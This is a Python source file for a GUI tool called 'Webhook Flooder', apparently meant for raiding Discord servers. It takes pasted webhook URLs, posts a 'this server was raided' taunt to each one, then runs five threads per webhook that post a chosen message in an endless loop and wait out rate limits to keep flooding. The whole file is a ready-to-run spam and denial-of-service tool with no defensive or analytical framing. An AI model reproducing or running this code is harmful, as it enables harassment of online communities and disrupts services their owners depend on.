print('Loading...')

from requests import post
from tkinter import Tk, Label, Entry, Button, INSERT, messagebox
from pyperclip import paste
from threading import Thread
from colorama import init, Fore; init()
from time import sleep
from os import system
from webbrowser import open as webopen
webhooks=[]

sented=0
invalids=[]
showederror=False

def creator():
	webopen('https://github.com/Its-LALOL/Discord-Webhook-Flooder', new=2)
def Flooder(webhook, jsoncode):
	global sented
	global invalids
	global showederror
	while True:
		try: response=post(webhook, json=jsoncode)
		except: 
			break
		if response.status_code==200 or response.status_code==202 or response.status_code==204:
			sented+=1
			print(f'{Fore.GREEN}Sented {sented} messages')
		elif response.status_code==429:
			print(Fore.YELLOW+'Ratelimited')
			json_data=response.json()
			if 100 > json_data['retry_after']:
				sleep(json_data['retry_after'])
		else:
			break
	if webhook in invalids:
		if len(webhooks)==len(invalids):
			if not showederror:
				showederror=True
				messagebox.showerror('Webhook Flooder', 'All webhooks invalid!')
				return
	invalids.append(webhook)
	print(Fore.RED+webhook)
def start():
	jsoncode={'username': username_input.get(), 'content': text_input.get()}
	for webhook in webhooks:
		try: post(webhook, json={'username': 'Webhook Flooder by LALOL', 'content': '**This server was raided using Webhook Flooder by LALOL :clown:\nhttps://github.com/Its-LALOL/Discord-Webhook-Flooder**'})
		except: pass
		for i in range(5):
			Thread(target=Flooder, args=(webhook, jsoncode)).start()
def add_webhook():
	webhook=webhook_input.get()
	webhooks.append(webhook)
	webhook_input.delete(0, 'end')
	webhooks_count.config(text=f'{len(webhooks)} Webhooks Loaded')
def paste_webhook():
	webhook=paste()
	webhook_input.insert(INSERT, webhook)
def paste_text():
	text=paste()
	text_input.insert(INSERT, text)
window=Tk()
window.resizable(width=False, height=False)
window.geometry('255x125')
window.title('Webhook Flooder')
window.config(bg='black')
Label(window, text='Webhook: ', fg='white', bg='black').place(x=0, y=0)
webhook_input=Entry(width=30, fg='black', bg='grey')
webhook_input.place(x=70, y=0)
webhooks_count=Label(window, text='0 Webhooks Loaded', fg='grey', bg='black')
webhooks_count.place(x=0, y=20)
Button(text='Paste', fg='black', bg='grey', command=paste_webhook).place(x=130, y=20)
Button(text='Add Webhook', fg='black', bg='grey', command=add_webhook).place(x=168, y=20)
Label(window, text='Username: ', fg='white', bg='black').place(x=0, y=43)
username_input=Entry(width=30, fg='black', bg='grey')
username_input.place(x=70, y=43)
Label(window, text='Text: ', fg='white', bg='black').place(x=0, y=63)
text_input=Entry(width=30, fg='black', bg='grey')
text_input.place(x=70, y=63)
Button(text='Paste',fg='black', bg='grey', command=paste_text).place(x=215, y=83)
Button(text='Start Flooding', fg='red', bg='grey', command=start).place(x=0, y=103)
Button(text='Created by LALOL', fg='yellow', bg='grey', command=creator).place(x=67, y=103)
system('cls||clear')
window.mainloop()
